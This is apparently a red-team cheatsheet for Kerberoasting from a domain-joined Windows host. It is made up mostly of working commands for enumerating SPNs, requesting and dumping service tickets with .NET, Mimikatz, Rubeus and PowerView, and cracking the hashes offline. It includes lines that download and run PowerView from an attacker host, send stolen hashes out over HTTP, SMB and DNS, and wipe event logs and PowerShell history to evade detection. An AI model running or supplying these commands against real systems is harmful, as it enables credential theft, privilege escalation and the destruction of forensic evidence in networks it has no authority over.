---
title: "Kerberoasting — Local On-Host"
description: "[1] Enumerate SPNs → [2] Request TGS Ticket → [3] Extract Hash → [4] Crack Offline"
category: active-directory
tags: ["active-directory", "kerberos", "sql-injection", "hashing"]
tools: ["Impacket", "Mimikatz", "Rubeus", "Hashcat", "John"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/Kerberos/Kerberoasting — Local On-Host Cheatsheet.md"
---
# 🎟️ Kerberoasting — Local / On-Host Cheatsheet

> Focused on techniques executable **directly on a domain-joined Windows machine** using native tools, .NET, and in-memory methods (LOTL).

---

## ⚡ Quick Reference — Attack Flow

```
[1] Enumerate SPNs  →  [2] Request TGS Ticket  →  [3] Extract Hash  →  [4] Crack Offline
```

---

## 🔎 Phase 1 — SPN Enumeration (No Tools Required)

### Built-in `setspn.exe`
```cmd
:: All SPNs in the domain
setspn -T DOMAIN.LOCAL -Q */*

:: All SPNs on a specific host
setspn -L hostname

:: Find SQL SPNs specifically
setspn -T DOMAIN.LOCAL -Q MSSQLSvc/*

:: Find HTTP SPNs
setspn -T DOMAIN.LOCAL -Q HTTP/*
```

### Native PowerShell + .NET (No Imports)
```powershell
# Enumerate all user accounts with SPNs via ADSI
$search = New-Object DirectoryServices.DirectorySearcher
$search.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$search.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset"))
$results = $search.FindAll()
$results | ForEach-Object {
    Write-Host "User: $($_.Properties['samaccountname'])"
    Write-Host "SPN:  $($_.Properties['serviceprincipalname'])"
    Write-Host "PwdLastSet: $($_.Properties['pwdlastset'])"
    Write-Host "---"
}
```

### Active Directory PowerShell Module (if available)
```powershell
# Import module (requires RSAT or AD module)
Import-Module ActiveDirectory

# Get kerberoastable users
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName, PasswordLastSet, MemberOf |
    Select-Object Name, SamAccountName, ServicePrincipalName, PasswordLastSet |
    Sort-Object PasswordLastSet

# Find accounts with old passwords (easiest to crack)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName, PasswordLastSet |
    Where-Object { $_.PasswordLastSet -lt (Get-Date).AddYears(-1) } |
    Select-Object SamAccountName, PasswordLastSet, ServicePrincipalName
```

### PowerView (PowerSploit)
```powershell
# Load into memory (no disk drop)
iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')

# Get all SPN users
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName, PasswordLastSet

# Get specific SPN types
Get-DomainUser -SPN | Where-Object { $_.ServicePrincipalName -like "*SQL*" }

# Get kerberoastable users with admin rights (high value)
Get-DomainUser -SPN | Get-DomainGroup -MemberIdentity | Where-Object { $_.Name -like "*Admin*" }
```

---

## 🎯 Phase 2 — Ticket Request & Extraction

### Method 1 — Pure .NET (No Tools, In-Memory)
```powershell
# Request a single TGS ticket for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList "MSSQLSvc/sqlserver.domain.local:1433"

# Verify ticket is now in cache
klist
```

### Method 2 — Request All SPN Tickets via .NET Loop
```powershell
# Enumerate SPNs and request all tickets in one loop
Add-Type -AssemblyName System.IdentityModel

$search = New-Object DirectoryServices.DirectorySearcher
$search.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt))"
$search.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
$search.FindAll() | ForEach-Object {
    $spn = $_.Properties['serviceprincipalname'][0]
    Write-Host "[*] Requesting ticket for: $spn"
    try {
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
    } catch { Write-Host "[-] Failed: $_" }
}

# Export all tickets from memory with Mimikatz after
```

### Method 3 — Mimikatz (Export Tickets from Memory)
```powershell
# After tickets are loaded into memory via .NET above

# From Mimikatz console:
kerberos::list /export          # Export all tickets to .kirbi files

# Or directly dump hash from ticket
kerberos::ask /target:MSSQLSvc/sqlserver.domain.local:1433
```

### Method 4 — Rubeus (C# — Drop or Load In-Memory)
```powershell
# Dump all kerberoastable hashes (hashcat format)
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat /nowrap

# Recon only — no ticket requests made
.\Rubeus.exe kerberoast /stats

# Target a single user
.\Rubeus.exe kerberoast /user:svc_mssql /format:hashcat /nowrap

# Force RC4 downgrade (faster to crack)
.\Rubeus.exe kerberoast /tgtdeleg /format:hashcat /nowrap

# Filter by stale passwords (high-value targets)
.\Rubeus.exe kerberoast /pwdsetbefore:01-01-2022 /format:hashcat /nowrap

# Roast a specific OU
.\Rubeus.exe kerberoast /ou:"OU=ServiceAccounts,DC=domain,DC=local" /format:hashcat

# Use an existing TGT (avoid touching your own credentials)
.\Rubeus.exe kerberoast /ticket:doIFuj[...]lDT0k= /format:hashcat /nowrap
```

### Method 5 — Invoke-Kerberoast (PowerShell, No Binary Drop)
```powershell
# Load PowerSploit PowerView
iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')

# Get all hashes in Hashcat format
Invoke-Kerberoast -OutputFormat Hashcat |
    Select-Object -ExpandProperty Hash |
    Out-File -FilePath C:\Users\Public\hashes.txt -Encoding ASCII

# John format
Invoke-Kerberoast -OutputFormat John | Select-Object Hash | fl

# Target specific domain
Invoke-Kerberoast -Domain dev.corp.local -OutputFormat Hashcat | fl

# With alternate credentials
$pass = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
$cred = New-Object Management.Automation.PSCredential('DOMAIN\user', $pass)
Invoke-Kerberoast -Credential $cred -OutputFormat Hashcat | fl
```

### Method 6 — LOTL via `klist` + `certutil` Exfil
```cmd
:: View tickets currently cached
klist

:: Purge all tickets (cleanup)
klist purge

:: Inspect a specific ticket
klist tickets -v
```

---

## 📦 Phase 3 — Exfiltrate Hashes

```powershell
# Base64 encode and print (easy copy-paste exfil)
$hash = Get-Content C:\Users\Public\hashes.txt
[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($hash))

# Exfil via HTTP to attacker machine
$hash = Get-Content C:\Users\Public\hashes.txt -Raw
Invoke-WebRequest -Uri "http://<attacker>:8080/?h=$hash" -Method GET

# Exfil via SMB (if share available)
Copy-Item C:\Users\Public\hashes.txt \\<attacker>\share\hashes.txt

# DNS exfil (one chunk at a time)
$hash = (Get-Content C:\Users\Public\hashes.txt)[0]
Resolve-DnsName "$hash.<attacker-domain>"
```

---

## 🔨 Phase 4 — Crack Locally (Attacker Machine)

### Hashcat Quick Reference
```bash
# RC4 / Type 23 — most common, fastest
hashcat -m 13100 hashes.txt rockyou.txt

# AES-128 / Type 17
hashcat -m 19600 hashes.txt rockyou.txt

# AES-256 / Type 18
hashcat -m 19700 hashes.txt rockyou.txt

# With rules (best64 = good balance)
hashcat -m 13100 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Combinator attack (wordlist + wordlist)
hashcat -m 13100 -a 1 hashes.txt words1.txt words2.txt

# Mask attack — 8 chars, Capital+lower+2digits
hashcat -m 13100 -a 3 hashes.txt ?u?l?l?l?l?l?d?d

# Resume a cracking session
hashcat -m 13100 hashes.txt rockyou.txt --restore

# Show cracked passwords
hashcat -m 13100 hashes.txt --show
```

### John the Ripper
```bash
john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
john --format=krb5tgs hashes.txt --show
```

---

## 🥷 Staying Stealthy — OPSEC on Host

| Action | Stealthy Option | Why |
|---|---|---|
| Enumeration | ADSI .NET query or `setspn` | Looks like admin activity |
| Ticket request | Single target `/user:` | Less noise than bulk roasting |
| Avoid RC4 force | Request AES tickets | `0x17` etype in Event 4769 is a red flag |
| No binary drop | PowerShell in-memory | Reduces forensic artefacts |
| Use `/stats` first | Rubeus recon only | Zero KDC requests |
| Timestamp awareness | Off-hours blending | Match normal baseline traffic |
| Cleanup | `klist purge` post-attack | Removes ticket artefacts from memory |

---

## 🧹 Post-Exploitation Cleanup

```powershell
# Remove exported ticket files
Remove-Item C:\Users\Public\hashes.txt -Force
Remove-Item *.kirbi -Force

# Purge Kerberos ticket cache
klist purge

# Clear PowerShell history
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force

# Clear Windows event logs (if admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

---

## 🗺️ High-Value SPN Targets

| SPN Prefix | Service | Why Valuable |
|---|---|---|
| `MSSQLSvc/*` | SQL Server | Often runs as domain user with high privileges |
| `HTTP/*` | IIS / Web | May have access to web app databases |
| `TERMSRV/*` | RDP service | Lateral movement to servers |
| `exchangeMDB/*` | Exchange | Access to mail data |
| `WSMAN/*` | WinRM | Remote management |
| `SPN on Domain Admin` | Any | Instant privilege escalation if cracked |

---

## 📋 One-Liner Cheatsheet

```powershell
# Full LOTL pipeline — enumerate + request + dump (no tools)
Add-Type -AssemblyName System.IdentityModel; `
(New-Object DirectoryServices.DirectorySearcher([ADSI]"", `
"(&(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt))", `
@("samaccountname","serviceprincipalname"))).FindAll() | % { `
    $_.Properties['serviceprincipalname'] | % { `
        try { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ } catch {} } }; klist
```

```powershell
# Invoke-Kerberoast one-liner (needs PowerView loaded)
Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt -Encoding ASCII
```

```bash
# Remote one-liner (Impacket)
GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC_IP> -request -outputfile hashes.txt && hashcat -m 13100 hashes.txt rockyou.txt
```
